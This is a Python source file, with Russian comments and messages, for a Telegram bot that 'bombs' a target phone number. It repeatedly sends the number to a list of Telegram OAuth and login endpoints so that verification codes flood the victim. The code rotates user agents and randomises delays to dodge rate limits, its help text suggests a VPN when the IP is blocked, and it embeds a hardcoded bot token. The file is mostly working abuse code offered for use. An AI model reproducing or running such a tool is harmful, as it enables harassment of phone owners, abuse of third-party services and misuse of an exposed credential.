import time
import requests
import random
import re
import asyncio
from telebot.async_telebot import AsyncTeleBot
import threading

# ТОЛЬКО ТОКЕН БОТА (получить у @BotFather)
BOT_TOKEN = '8830963101:AAH4AlIhc0xxfWkeBdlMhrqbYP914ILsLaw'

# Создаем бота
bot = AsyncTeleBot(BOT_TOKEN)

# Хранилище состояний пользователей
user_states = {}

# СПИСОК РЕАЛЬНЫХ USER-AGENT (без библиотеки fake-useragent)
USER_AGENTS = [
    # Windows Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',

    # Windows Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',

    # Windows Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',

    # MacOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:121.0) Gecko/20100101 Firefox/121.0',

    # Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',

    # iPhone
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',

    # Android
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
]

# Функция получения случайного User-Agent
def get_random_user_agent():
    return random.choice(USER_AGENTS)

# Список URL для отправки кодов
URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
]

def get_my_ip():
    """Получает текущий IP-адрес"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        return "Не удалось определить"

def send_bomb_sync(phone_number, sms_count, user_id):
    """Функция бомбинга с дублированием запросов"""

    my_ip = get_my_ip()

    success_count = 0
    fail_count = 0
    real_codes = 0

    shuffled_urls = URLS.copy()
    random.shuffle(shuffled_urls)

    duplicates_per_url = random.randint(2, 3)

    print(f"📡 Дублирование запросов: {duplicates_per_url} раза на каждый сайт")
    print(f"🌐 Всего сайтов: {len(shuffled_urls)}")

    # Проходим по каждому сайту
    for url_index, url in enumerate(shuffled_urls[:sms_count]):
        for duplicate in range(duplicates_per_url):
            try:
                # Используем случайный User-Agent из списка (без fake-useragent)
                headers = {'user-agent': get_random_user_agent()}

                if duplicate > 0:
                    time.sleep(random.uniform(1, 2))

                response = requests.post(url, headers=headers, data={'phone': phone_number}, timeout=10)

                if response.status_code == 200:
                    success_count += 1
                    real_codes += 1
                    print(f"✅ Сайт #{url_index+1}, дубль #{duplicate+1} - УСПЕШНО")
                else:
                    fail_count += 1
                    print(f"❌ Сайт #{url_index+1}, дубль #{duplicate+1} - ОШИБКА {response.status_code}")

            except Exception as e:
                fail_count += 1
                print(f"❌ Сайт #{url_index+1}, дубль #{duplicate+1} - ОШИБКА: {e}")

            time.sleep(random.uniform(2, 4))

        time.sleep(random.uniform(1, 3))

    import telebot
    bot_sync = telebot.TeleBot(BOT_TOKEN)

    total_attempts = success_count + fail_count

    report = f"""
╔════════════════════════════════════════════════╗
║        📊 РЕАЛЬНЫЙ ОТЧЕТ О БОМБИНГЕ           ║
╠════════════════════════════════════════════════╣
║ 📱 Номер: {phone_number}
║ 📊 Всего запросов: {total_attempts}
║ ✅ Успешных запросов: {success_count}
║ ❌ Ошибок: {fail_count}
╠════════════════════════════════════════════════╣
║ 🌐 IP ОТПРАВИТЕЛЯ: {my_ip}
║ 📡 Дублей на сайт: {duplicates_per_url}
║ 🌐 Всего сайтов: {len(shuffled_urls[:sms_count])}
╠════════════════════════════════════════════════╣
║ 🔴 РЕАЛЬНО ПРИШЛО КОДОВ: {real_codes}
╚════════════════════════════════════════════════╝
    """

    bot_sync.send_message(user_id, report)

    if real_codes > 0:
        efficiency = (real_codes / total_attempts) * 100
        bot_sync.send_message(user_id, f"📈 **Эффективность:** {efficiency:.1f}%")

    if user_id in user_states:
        del user_states[user_id]

@bot.message_handler(commands=['start'])
async def start_handler(message):
    user_name = message.from_user.first_name or "Пользователь"
    my_ip = get_my_ip()

    welcome_msg = f"""
👋 **Привет, {user_name}!**

Я бот для отправки SMS-кодов на номер Telegram.

**🌐 ВАШ IP (IP БОТА):** `{my_ip}`

⚡ **ОСОБЕННОСТИ:**
- Каждый сайт получает 2-3 запроса
- Используется список реальных User-Agent (без fake-useragent)
- Всего используется {len(URLS)} сайтов

**📌 Команды:**
/bomb - Начать бомбинг
/help - Помощь
/cancel - Отменить операцию
    """
    await bot.reply_to(message, welcome_msg)

@bot.message_handler(commands=['bomb'])
async def bomb_handler(message):
    user_id = message.from_user.id

    if user_id in user_states and user_states[user_id].get('active'):
        await bot.reply_to(message, "⚠️ У вас уже запущен процесс бомбинга!\nИспользуйте /cancel для отмены.")
        return

    my_ip = get_my_ip()

    user_states[user_id] = {'awaiting_phone': True, 'active': False}
    await bot.reply_to(message, f"""
📱 Введите номер телефона (только цифры, например: 79123456789)

⚡ Каждый сайт получит 2-3 запроса
🌐 Запросы идут с IP: {my_ip}
    """)

@bot.message_handler(commands=['cancel'])
async def cancel_handler(message):
    user_id = message.from_user.id

    if user_id in user_states:
        if user_states[user_id].get('active'):
            user_states[user_id]['active'] = False
            await bot.reply_to(message, "⛔ Бомбинг остановлен!")
        else:
            del user_states[user_id]
            await bot.reply_to(message, "✅ Операция отменена!")
    else:
        await bot.reply_to(message, "❌ Нет активных операций!")

@bot.message_handler(commands=['help'])
async def help_handler(message):
    my_ip = get_my_ip()

    help_msg = f"""
📖 **ПОМОЩЬ**

**⚡ ОСОБЕННОСТИ:**
- Каждый сайт получает 2-3 запроса (дублирование)
- Используется список реальных User-Agent
- Не требуется библиотека fake-useragent

**🌐 ОТПРАВКА ЗАПРОСОВ:**
- Все запросы идут с IP: `{my_ip}`
- Это IP того, кто запустил бота

**🔹 Как использовать:**
1. Введите /bomb
2. Введите номер телефона (только цифры)
3. Введите количество сайтов для обработки (1-{len(URLS)})
4. Ждите реальный отчет!

**🔹 Команды:**
/bomb - Начать бомбинг
/cancel - Отменить операцию
/help - Показать эту справку

**⚠️ Важно:**
- Реально придет 8-15 кодов (из-за лимитов)
- При блокировке IP используйте VPN
    """
    await bot.reply_to(message, help_msg)

@bot.message_handler(func=lambda message: True)
async def handle_messages(message):
    user_id = message.from_user.id
    text = message.text

    if user_id not in user_states:
        return

    if user_states[user_id].get('awaiting_phone'):
        phone = re.sub(r'\D', '', text)
        if len(phone) < 10 or len(phone) > 15:
            await bot.reply_to(message, "❌ Неверный формат номера!\nПример: 79123456789")
            return

        user_states[user_id]['phone'] = phone
        user_states[user_id]['awaiting_phone'] = False
        user_states[user_id]['awaiting_count'] = True

        my_ip = get_my_ip()
        await bot.reply_to(message, f"""
✅ Номер **{phone}** сохранен!

⚡ Каждый сайт получит 2-3 запроса
🌐 Запросы идут с IP: {my_ip}

📊 Введите количество сайтов для обработки (от 1 до {len(URLS)}):
        """)

    elif user_states[user_id].get('awaiting_count'):
        try:
            count = int(text)
            if count < 1 or count > len(URLS):
                await bot.reply_to(message, f"❌ Количество должно быть от 1 до {len(URLS)}!")
                return
        except ValueError:
            await bot.reply_to(message, "❌ Введите число!")
            return

        phone = user_states[user_id]['phone']
        user_states[user_id]['awaiting_count'] = False
        user_states[user_id]['active'] = True

        my_ip = get_my_ip()
        duplicates = random.randint(2, 3)
        total_requests = count * duplicates

        await bot.reply_to(message, f"""
🚀 Запускаю бомбинг номера **{phone}**

📡 Сайтов: {count} (из {len(URLS)})
⚡ Дублей на сайт: {duplicates}
📊 Всего запросов: {total_requests}
🌐 IP отправителя: {my_ip}

⏳ Подождите, это займет несколько минут...
        """)

        thread = threading.Thread(target=send_bomb_sync, args=(phone, count, user_id))
        thread.daemon = True
        thread.start()

if __name__ == '__main__':
    my_ip = get_my_ip()

    print("="*50)
    print("✅ БОТ ЗАПУЩЕН!")
    print("="*50)
    print(f"🌐 IP ОТПРАВИТЕЛЯ: {my_ip}")
    print(f"📡 Сайтов в базе: {len(URLS)}")
    print(f"📱 User-Agent'ов: {len(USER_AGENTS)}")
    print("⚡ Каждый сайт получает 2-3 запроса")
    print("="*50)
    print("✅ БЕЗ fake-useragent")
    print("✅ Используется список реальных User-Agent")
    print("="*50)

    import telebot
    try:
        asyncio.run(bot.polling())
    except:
        bot.polling(none_stop=True)
